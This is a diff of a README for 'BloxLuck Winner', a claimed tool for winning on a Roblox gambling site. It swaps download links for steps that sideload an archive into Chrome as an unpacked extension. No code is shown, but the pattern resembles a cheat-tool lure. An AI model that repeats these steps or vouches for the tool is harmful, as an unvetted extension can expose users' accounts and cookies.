@@ -11,13 +11,19 @@
 ## 📖 About
 
 **Roblox** This is a BloxLuck Winner.
- 
-
 > ⚠️ Note: You Accept the Usage Responsibilities.
 
 ---
 
-## 📎 Links
+## 🔧 Installation
 
-- 🔗 [Official Repository](https://github.com/rethard/BloxLuck-)
-- 📥 [Direct ZIP Download](https://github.com/rethard/BloxLuck-/releases/download/v1.0/BloxLuck.Winner.rar)
+1. **Download** the Bloxwin release.
+2. **Extract** the ZIP archive.
+3. Open Chrome and go to `chrome://extensions/`
+4. Enable **Developer mode**
+5. Click **"Load unpacked"** and select the extracted folder.
+
+
+## 📜 License
+
+Distributed under the MIT License. See [LICENSE](/LICENSE) for details.
